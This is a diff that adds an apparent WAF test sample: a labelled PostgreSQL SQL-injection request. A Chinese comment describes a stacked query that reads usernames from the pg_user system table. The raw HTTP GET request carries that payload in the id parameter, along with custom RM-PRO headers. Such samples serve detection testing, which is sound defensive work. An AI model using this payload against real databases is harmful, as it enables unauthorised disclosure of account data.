@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506346
+# 攻击者基于堆叠查询，将"select usename from pg_user"语句注入到 SQL 查询参数中，从PostgreSQL数据库的系统表pg_user中选择用户名（usename字段）。
+GET /?id=1%3Bselect%20usename%20from%20pg_user&bid=hd_tag_m8mv23z1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23z1
+RM-PRO-Token: 85e7b528fcf5e3557216a66cadabcaf5
+RM-PRO-Time: 1742808353627
+User-Agent: curl/7.83.1
+
